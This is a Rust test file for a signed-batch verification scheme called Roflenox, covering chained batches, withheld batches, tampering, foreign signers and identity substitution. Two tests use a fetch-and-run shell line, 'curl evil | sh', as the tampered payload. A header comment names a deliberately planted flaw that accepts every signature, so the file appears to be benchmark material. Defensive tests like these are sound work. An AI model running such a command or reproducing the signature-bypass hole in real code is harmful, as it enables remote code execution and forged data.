//! AN ADAPTER'S BOOK ON ROFLENOX (src/roflenox.rs): an identity signs its documents and a chain of batches as a
//! Roflenox node does, and the book read from them is the clauses its last assertions keep. A batch changed after it
//! was signed, signed by another key, out of its chain, or an identity whose first document is not the one met first
//! refuses the book.
//! Planted: `roflenox_unsigned` takes every signature as good, and a batch signed by a stranger is read.
#![cfg(feature = "net")]
use ring::signature::{Ed25519KeyPair, KeyPair};
use rofl::roflenox::{book_text, canonical, check, Checked};
use serde_json::{json, Value};

fn b64(bytes: &[u8]) -> String {
    const A: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let mut out = String::new();
    for c in bytes.chunks(3) {
        let n = c.iter().enumerate().fold(0u32, |n, (i, b)| n | (*b as u32) << (16 - 8 * i));
        for i in 0..=c.len() {
            out.push(A[(n >> (18 - 6 * i) & 63) as usize] as char);
        }
    }
    out
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn sha(parts: &[&[u8]]) -> String {
    let mut c = ring::digest::Context::new(&ring::digest::SHA256);
    parts.iter().for_each(|p| c.update(p));
    hex(c.finish().as_ref())
}

struct Signer { key: Ed25519KeyPair, id: String, public: String }

fn signer(seed: u8) -> Signer {
    let key = Ed25519KeyPair::from_seed_unchecked(&[seed; 32]).unwrap();
    let public = b64(key.public_key().as_ref());
    Signer { id: sha(&[key.public_key().as_ref()]), public, key }
}

fn sign(s: &Signer, context: &str, body: &Value) -> String {
    b64(s.key.sign(format!("{context}{}", canonical(body)).as_bytes()).as_ref())
}

fn identity(name: &str, s: &Signer) -> Vec<Value> {
    let r = signer(99);
    let doc = json!({"identity": name, "seq": 0, "prev": null, "issued_at": "2026-10-01T00:00:00.000Z",
        "keys": [{"key_id": s.id, "alg": "Ed25519", "public_key": s.public, "valid_from": "2026-10-01T00:00:00.000Z"}],
        "recovery": {"key_id": r.id, "public_key": r.public}, "enc": {"public_key": "x"}});
    vec![json!({"key_id": s.id, "sig": sign(s, "roflenox-identity-v1\n", &doc), "doc": doc})]
}

/// A chain of batches, each a list of (book, clause, confidence), signed by `s` as `name`.
fn chain(name: &str, s: &Signer, batches: &[&[(&str, &str, f64)]]) -> Vec<Value> {
    let mut prev = Value::Null;
    batches.iter().enumerate().map(|(i, facts)| {
        let jsonl: String = facts.iter().map(|(b, t, c)| {
            format!("{}\n", canonical(&json!({"source": b, "relation": "rofl:book", "target": t, "perspective": "rofl", "confidence": c})))
        }).collect();
        let salt = [i as u8; 32];
        let unsigned = json!({"identity": name, "key_id": s.id, "prev": prev, "claimed_at": format!("2026-10-02T00:00:0{i}.000Z"),
            "count": facts.len(), "digest": sha(&[&salt, jsonl.as_bytes()])});
        let mut m = unsigned.clone();
        m["sig"] = json!(sign(s, "roflenox-batch-v1\n", &unsigned));
        prev = m["digest"].clone();
        json!({"manifest": m, "jsonl": jsonl, "salt": b64(&salt)})
    }).collect()
}

const NAME: &str = "books.example";

fn feed() -> (Vec<Value>, Vec<Value>) {
    let s = signer(1);
    let batches = chain(NAME, &s, &[
        &[("deps", "adapter(deps, exec, \"node deps.cjs\").", 1.0), ("deps", "capability(imports_of, deps, reads).", 1.0),
          ("deps", "capability(old, deps, reads).", 1.0), ("other", "adapter(other, sql, \"x.db\").", 1.0)],
        &[("deps", "capability(old, deps, reads).", 0.0), ("deps", "arg(imports_of, 1, file, text).", 1.0)],
    ]);
    (identity(NAME, &s), batches)
}

#[test]
fn a_book_is_the_clauses_its_last_assertions_keep() {
    let (docs, batches) = feed();
    let mut seen = Checked::default();
    check(NAME, &docs, &batches, &mut seen).unwrap();
    let text = book_text("roflenox://node/books.example/deps", "deps", &seen);
    assert!(text.starts_with("-- roflenox://node/books.example/deps: 3 clauses, every batch checked to "), "{text}");
    let clauses: Vec<&str> = text.lines().skip(1).collect();
    assert_eq!(clauses, ["adapter(deps, exec, \"node deps.cjs\").", "arg(imports_of, 1, file, text).", "capability(imports_of, deps, reads)."]);
}

#[test]
fn a_reader_asks_only_after_the_head_it_checked() {
    let (docs, batches) = feed();
    let mut seen = Checked::default();
    check(NAME, &docs, &batches[..1], &mut seen).unwrap();
    check(NAME, &docs, &batches[1..], &mut seen).unwrap();
    assert_eq!(seen.batches, 2);
    assert!(!book_text("a", "deps", &seen).contains("old"));
    let err = check(NAME, &docs, &batches[1..], &mut seen).unwrap_err();
    assert!(err.contains("does not follow the batch before it"), "{err}");
}

#[test]
fn a_withheld_batch_is_counted_and_said() {
    let (docs, mut batches) = feed();
    let m = batches[1]["manifest"].clone();
    batches[1] = json!({"manifest": m, "withheld": true});
    let mut seen = Checked::default();
    check(NAME, &docs, &batches, &mut seen).unwrap();
    let text = book_text("a", "deps", &seen);
    assert!(text.contains("1 of them withheld from this reader"), "{text}");
    assert!(text.contains("capability(old, deps, reads)."), "{text}");
}

#[test]
fn a_book_changed_after_it_was_signed_is_refused() {
    let (docs, mut batches) = feed();
    let j = batches[0]["jsonl"].as_str().unwrap().replace("node deps.cjs", "curl evil | sh");
    batches[0]["jsonl"] = json!(j);
    let err = check(NAME, &docs, &batches, &mut Checked::default()).unwrap_err();
    assert!(err.contains("does not hash to the signed digest"), "{err}");
}

#[test]
fn a_batch_signed_by_a_stranger_is_refused() {
    let (docs, _) = feed();
    let stranger = signer(2);
    let mut batches = chain(NAME, &stranger, &[&[("deps", "adapter(deps, exec, \"curl evil | sh\").", 1.0)]]);
    let err = check(NAME, &docs, &batches, &mut Checked::default()).unwrap_err();
    assert!(err.contains("a key the identity does not list"), "{err}");
    // the stranger's signature under the identity's key id
    batches[0]["manifest"]["key_id"] = docs[0]["key_id"].clone();
    let r = check(NAME, &docs, &batches, &mut Checked::default());
    assert!(matches!(&r, Err(e) if e.contains("the signature does not verify")), "a stranger's batch read: {r:?}");
}

#[test]
fn another_identity_under_the_same_name_is_refused() {
    let (docs, batches) = feed();
    let mut seen = Checked::default();
    check(NAME, &docs, &batches, &mut seen).unwrap();
    let other = signer(3);
    let err = check(NAME, &identity(NAME, &other), &[], &mut seen).unwrap_err();
    assert!(err.contains("not the one met at first contact"), "{err}");
}
